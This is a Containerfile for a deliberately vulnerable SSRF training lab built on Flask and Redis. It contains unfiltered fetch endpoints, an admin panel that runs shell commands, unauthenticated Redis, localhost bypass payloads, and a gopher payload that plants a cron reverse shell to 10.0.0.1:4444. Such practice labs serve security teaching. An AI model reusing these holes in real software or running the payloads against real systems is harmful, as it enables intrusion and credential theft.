# ssrf.Containerfile
# SSRF lab with vulnerable Flask endpoints, internal Redis, simulated metadata
#
# Build:  podman build -t ssrf -f ssrf.Containerfile .
# Run:    podman run -d -p 5000:5000 ssrf
#
# Endpoints:
#   GET  /                        — Lab overview
#   GET  /fetch?url=...            — Basic SSRF: no filter
#   GET  /fetch-safe?url=...       — Whitelist bypass challenge: blocks "localhost" only
#   GET  /fetch-noip?url=...       — IP blacklist bypass: blocks 127.0.0.1 only
#   GET  /fetch-blind?url=...      — Blind SSRF: returns nothing useful
#   GET  /admin                    — Internal-only admin panel (only accessible via localhost)
#   GET  /meta/latest/meta-data/   — Simulated cloud metadata endpoint
#   Redis on localhost:6379        — Internal Redis (no auth) for SSRF → RCE practice

FROM docker.io/library/python:3-slim

RUN pip install flask redis

WORKDIR /app

# Install Redis
RUN apt-get update && apt-get install -y redis-server procps netcat-openbsd \
    && rm -rf /var/lib/apt/lists/*

# Configure Redis with no authentication and no binding protection
RUN sed -i 's/^bind 127.0.0.1/bind 0.0.0.0/' /etc/redis/redis.conf \
    && sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf \
    && echo 'requirepass ""' >> /etc/redis/redis.conf

COPY <<'APPEOF' /app/app.py
import os
import socket
import struct
import subprocess
import ipaddress
import urllib.request
import urllib.parse
import base64
import requests
from flask import Flask, request, render_template_string, Response

app = Flask(__name__)

HTML_HEAD = '''
<!DOCTYPE html>
<html><head><title>SSRF Lab</title>
<style>body{font-family:monospace;max-width:950px;margin:20px auto;padding:20px;background:#111;color:#0f0}
pre,code{background:#222;padding:12px;display:block;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
.hint{color:#ff0}.error{color:#f00}.success{color:#0f0}
h2{border-bottom:1px solid #333;padding-bottom:5px;margin-top:30px}
table{width:100%;border-collapse:collapse}
td,th{padding:6px;text-align:left;border:1px solid #333}
input[type=text]{width:70%;background:#222;color:#0f0;border:1px solid #0a0;padding:5px}
input[type=submit]{background:#0a0;color:#000;border:none;padding:6px 18px;cursor:pointer}
a{color:#0af}
</style></head><body>
<h1>SSRF Exploitation Lab</h1>
<p class="hint">All /fetch endpoints make server-side HTTP requests to the URL you provide.</p>
'''

HTML_FOOT = '''
<hr>
<h2>Available Endpoints</h2>
<table>
<tr style="background:#222"><th>Method</th><th>Endpoint</th><th>Filter</th><th>Description</th></tr>
<tr><td>GET</td><td>/fetch?url=</td><td style="color:#f00">None</td><td>Basic SSRF — fetches any URL</td></tr>
<tr><td>GET</td><td>/fetch-safe?url=</td><td>Blocks "localhost"</td><td>Whitelist bypass challenge</td></tr>
<tr><td>GET</td><td>/fetch-noip?url=</td><td>Blocks "127.0.0.1"</td><td>IP blacklist bypass challenge</td></tr>
<tr><td>GET</td><td>/fetch-blind?url=</td><td>None</td><td>Blind SSRF — no response data</td></tr>
<tr><td>GET</td><td>/admin</td><td>Localhost only</td><td>Internal admin panel</td></tr>
<tr><td>GET</td><td>/meta/latest/meta-data/</td><td>Localhost only</td><td>Simulated AWS metadata endpoint</td></tr>
</table>
<h2>Internal Services</h2>
<table>
<tr style="background:#222"><th>Service</th><th>Port</th><th>SSRF→RCE Path</th></tr>
<tr><td>Redis</td><td>6379</td><td>gopher:// → CONFIG SET → cron / authorized_keys</td></tr>
<tr><td>Flask Admin</td><td>5000 (localhost only /admin)</td><td>http://127.0.0.1:5000/admin → admin actions</td></tr>
<tr><td>Metadata Sim</td><td>5000 (/meta)</td><td>Cloud-style credential extraction</td></tr>
</table>
</body></html>
'''

# ── Simulated Cloud Metadata ──────────────────────────────────────────
@app.route('/meta/latest/meta-data/')
@app.route('/meta/latest/meta-data/<path:subpath>')
def metadata_api(subpath=''):
    """Simulate an AWS-style metadata endpoint — only accessible from localhost."""
    client_ip = request.remote_addr
    if client_ip not in ('127.0.0.1', '::1', 'localhost'):
        return 'This endpoint is only accessible from localhost (simulating cloud metadata)', 403

    meta_data = {
        '': 'ami-id\nhostname\niam/\ninstance-id\nlocal-hostname\npublic-keys/\n',
        'ami-id': 'ami-simulated-vulnerable',
        'hostname': 'ip-10-0-1-42.internal',
        'instance-id': 'i-0a1b2c3d4e5f67890',
        'local-hostname': 'ip-10-0-1-42.ec2.internal',
        'iam/': 'security-credentials/\n',
        'iam/security-credentials/': 'S3FullAccess\n',
        'iam/security-credentials/S3FullAccess': '''
{
  "Code" : "Success",
  "LastUpdated" : "2026-06-26T00:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjEJ...==",
  "Expiration" : "2027-06-26T00:00:00Z"
}''',
        'public-keys/': '0=my-key\n',
        'public-keys/0/openssh-key': 'ssh-rsa AAAAB3NzaC1yc2E... simulated-key',
    }

    if subpath in meta_data:
        return Response(meta_data[subpath], mimetype='text/plain')
    return 'Not found', 404


# ── Internal Admin Panel (localhost only) ─────────────────────────────
@app.route('/admin')
def admin_panel():
    client_ip = request.remote_addr
    if client_ip not in ('127.0.0.1', '::1'):
        return 'Access denied — only accessible from localhost. Try SSRF!', 403

    cmd_output = ''
    cmd = request.args.get('cmd', '')
    if cmd:
        try:
            cmd_output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
        except Exception as e:
            cmd_output = str(e)

    return render_template_string('''
    <!DOCTYPE html><html><head><title>Internal Admin Panel</title>
    <style>body{font-family:monospace;background:#111;color:#0f0;padding:20px}
    pre{background:#222;padding:10px}input{background:#222;color:#0f0;border:1px solid #0a0;padding:5px}
    </style></head><body>
    <h1>Internal Admin Panel</h1>
    <p class="hint">SSRF_CONFIRMED — You are accessing this from inside the server network. SSRF works!</p>
    <h2>Command Execution</h2>
    <form><input type="text" name="cmd" placeholder="id" size="50">
    <input type="submit" value="Execute"></form>
    {% if cmd %}
    <h3>Output:</h3><pre>{{ cmd_output }}</pre>
    {% endif %}
    <hr>
    <h2>Simulated Secret Data</h2>
    <pre>
    DATABASE_URL=postgres://admin:SuperSecretPassword123@db.internal:5432/production
    REDIS_URL=redis://:redis_secret_token@redis.internal:6379/0
    API_KEY=sk-proj-abcdef1234567890abcdef1234567890
    JWT_SECRET=7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b
    </pre>
    </body></html>
    ''', cmd=cmd, cmd_output=cmd_output)


# ── Basic SSRF — No Filter ────────────────────────────────────────────
@app.route('/fetch')
def fetch_basic():
    url = request.args.get('url', '')
    if not url:
        return HTML_HEAD + '''
        <h2>GET /fetch — Basic SSRF (No Filter)</h2>
        <p>Fetches any URL you provide. Full response returned.</p>
        <form><input type="text" name="url" placeholder="http://169.254.169.254/latest/meta-data/" size="60">
        <input type="submit" value="Fetch"></form>
        <pre>
# Read local files
curl "http://localhost:5000/fetch?url=file:///etc/passwd"

# Hit internal admin
curl "http://localhost:5000/fetch?url=http://127.0.0.1:5000/admin?cmd=id"

# Read cloud metadata (simulated)
curl "http://localhost:5000/fetch?url=http://127.0.0.1:5000/meta/latest/meta-data/iam/security-credentials/S3FullAccess"

# Port scan via dict://
curl "http://localhost:5000/fetch?url=dict://127.0.0.1:6379"

# Gopher to Redis
python3 -c "
import urllib.parse
payload = 'FLUSHALL\\r\\nSET test \\\"hello\\\"\\r\\nSAVE\\r\\nQUIT'
gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload)
print(gopher)
"
        </pre>
        ''' + HTML_FOOT

    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url

        if url.startswith('file://'):
            # Handle file:// scheme manually for path traversal demo
            filepath = url[7:]
            with open(filepath, 'r') as f:
                content = f.read()
            return render_template_string('''
            ''' + HTML_HEAD + '''
            <h2>Fetch Result (file://)</h2>
            <p class="hint">URL: {{ url }}</p>
            <p>Size: {{ size }} bytes</p>
            <pre>{{ content }}</pre>
            ''' + HTML_FOOT, url=url, size=len(content), content=content[:5000])

        r = requests.get(url, timeout=5, allow_redirects=True)
        return render_template_string('''
        ''' + HTML_HEAD + '''
        <h2>Fetch Result</h2>
        <p class="hint">URL: {{ url }}</p>
        <p>Status: {{ status }}</p>
        <p>Size: {{ size }} bytes</p>
        <p>Headers:</p>
        <pre>{{ headers }}</pre>
        <p>Body (first 5000 chars):</p>
        <pre>{{ body }}</pre>
        ''' + HTML_FOOT,
        url=url, status=r.status_code, size=len(r.content),
        headers=r.headers, body=r.text[:5000])
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Fetch Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Whitelist Bypass: Blocks "localhost" ──────────────────────────────
@app.route('/fetch-safe')
def fetch_safe():
    url = request.args.get('url', '')
    if not url:
        return HTML_HEAD + '''
        <h2>GET /fetch-safe — Whitelist Bypass Challenge</h2>
        <p>Blocks URLs containing "localhost". Find a way around it.</p>
        <form><input type="text" name="url" placeholder="Find a bypass..." size="60">
        <input type="submit" value="Fetch"></form>
        <pre>
Bypass techniques:
  - http://127.0.0.1:5000/admin
  - http://[::1]:5000/admin
  - http://0x7f000001:5000/admin
  - http://2130706433:5000/admin
  - http://0177.0.0.1:5000/admin
  - http://127.1:5000/admin
  - http://0.0.0.0:5000/admin
        </pre>
        ''' + HTML_FOOT

    if 'localhost' in url.lower():
        return HTML_HEAD + f'<h2 class="error">Blocked</h2><p>"localhost" is not allowed in URL: {url}</p>' + HTML_FOOT

    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url
        r = requests.get(url, timeout=5, allow_redirects=True)
        return HTML_HEAD + f'<h2 class="success">Fetched</h2><p>URL: {url}</p><p>Status: {r.status_code}</p><pre>{r.text[:3000]}</pre>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── IP Blacklist Bypass: Blocks "127.0.0.1" ───────────────────────────
@app.route('/fetch-noip')
def fetch_noip():
    url = request.args.get('url', '')
    if not url:
        return HTML_HEAD + '''
        <h2>GET /fetch-noip — IP Blacklist Bypass Challenge</h2>
        <p>Blocks "127.0.0.1" literally. Find alternative representations.</p>
        <form><input type="text" name="url" placeholder="Find a bypass..." size="60">
        <input type="submit" value="Fetch"></form>
        <pre>
Bypass techniques:
  - http://localhost:5000/admin
  - http://127.1:5000/admin
  - http://[::1]:5000/admin
  - http://0x7F000001:5000/admin
  - http://2130706433:5000/admin

Alternative IPs for internal services:
  - http://0.0.0.0:5000/admin  (all interfaces)
  - http://[::ffff:127.0.0.1]:5000/admin
        </pre>
        ''' + HTML_FOOT

    if '127.0.0.1' in url:
        return HTML_HEAD + f'<h2 class="error">Blocked</h2><p>"127.0.0.1" is not allowed in URL: {url}</p>' + HTML_FOOT

    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url
        r = requests.get(url, timeout=5, allow_redirects=True)
        return HTML_HEAD + f'<h2 class="success">Fetched</h2><p>URL: {url}</p><p>Status: {r.status_code}</p><pre>{r.text[:3000]}</pre>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2 class="error">Error</h2><pre>{str(e)}</pre>' + HTML_FOOT


# ── Blind SSRF ────────────────────────────────────────────────────────
@app.route('/fetch-blind')
def fetch_blind():
    url = request.args.get('url', '')
    if not url:
        return HTML_HEAD + '''
        <h2>GET /fetch-blind — Blind SSRF</h2>
        <p>Fetches the URL but reveals nothing in the response. Use OOB techniques.</p>
        <form><input type="text" name="url" placeholder="http://YOUR_COLLABORATOR/" size="60">
        <input type="submit" value="Fetch"></form>
        <pre>
# Test with a callback server
python3 -m http.server 8888

# Send a URL you control
curl "http://localhost:5000/fetch-blind?url=http://YOUR_IP:8888/test"

# Time-based port scan
curl -w "\\nTotal time: %{time_total}s\\n" \\
  "http://localhost:5000/fetch-blind?url=dict://127.0.0.1:6379"
        </pre>
        ''' + HTML_FOOT

    if not url:
        return 'No URL provided', 400

    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url
        r = requests.get(url, timeout=5, allow_redirects=True)
        # No response data returned — true blind SSRF
        return HTML_HEAD + '<h2 class="success">Request completed</h2><p>HTTP status: 200. No further details.</p>' + HTML_FOOT
    except requests.exceptions.Timeout:
        return HTML_HEAD + '<h2>Request timed out</h2><p>(Suggests the target is unreachable/filtered)</p>' + HTML_FOOT
    except Exception as e:
        return HTML_HEAD + f'<h2>Request error</h2><p>(Suggests the target refused connection or protocol error)</p>' + HTML_FOOT


# ── Gopher Payload Generator ──────────────────────────────────────────
@app.route('/tools/gopher')
def gopher_tool():
    return HTML_HEAD + '''
    <h2>Gopher URL Generator</h2>
    <p>Generates gopher:// URLs for SSRF → Redis exploitation.</p>
    <pre>
# Python one-liner for Redis cron job:
python3 -c "
import urllib.parse
cron_cmd = '* * * * * root bash -c \\\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\\"'
payload = 'FLUSHALL\\r\\nSET cron \\\"\\\\n\\\\n' + cron_cmd + '\\\\n\\\\n\\\"\\r\\nCONFIG SET dir /etc/cron.d\\r\\nCONFIG SET dbfilename shell\\r\\nSAVE\\r\\nQUIT'
gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload)
print(gopher)
"

# Then pass the gopher URL to /fetch
curl "http://localhost:5000/fetch?url=GOPHER_URL_HERE"
    </pre>
    ''' + HTML_FOOT


# ── Root ──────────────────────────────────────────────────────────────
@app.route('/')
def index():
    return HTML_HEAD + '''
    <p>Select an endpoint to practice SSRF.</p>
    <p class="hint">Redis is running internally on port 6379 with no authentication.</p>
    <p>Try the SSRF → Redis → Cron Job → Reverse Shell chain!</p>
    ''' + HTML_FOOT


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
APPEOF

# Startup script
RUN printf '#!/bin/bash\n\
set -e\n\
echo "Starting Redis..."\n\
redis-server /etc/redis/redis.conf --daemonize yes\n\
echo "Starting SSRF Lab..."\n\
cd /app && python3 app.py\n' > /start.sh && chmod +x /start.sh

EXPOSE 5000 6379

CMD ["/start.sh"]
